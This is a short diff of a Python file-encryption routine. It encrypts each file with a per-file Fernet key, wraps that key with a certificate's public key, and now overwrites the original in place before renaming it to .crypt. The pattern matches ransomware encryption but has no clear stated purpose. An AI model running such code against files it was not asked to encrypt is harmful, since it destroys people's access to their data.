@@ -54,8 +54,9 @@ try:
             try:
                 print("Encrypting file: " + path)
                 file_key = Fernet.generate_key()
-                with open(path, "rb") as file:
-                    encrypted = Fernet(file_key).encrypt(file.read())
+
+                with open(path, "rb") as file_to_encrypt:
+                    encrypted = Fernet(file_key).encrypt(file_to_encrypt.read())
 
                 encrypted_key = certificate["public_key"].encrypt(
                     file_key,
@@ -66,10 +67,10 @@ try:
                     )
                 )
 
-                os.remove(path)
-
-                with open(path + ".crypt", "wb") as encrypted_file:
+                with open(path, "wb") as encrypted_file:
                     encrypted_file.write(encrypted)
+
+                os.replace(path, path + ".crypt")
 
                 with open(path + ".crypt.key", "wb") as encrypted_file_key:
                     encrypted_file_key.write(encrypted_key)
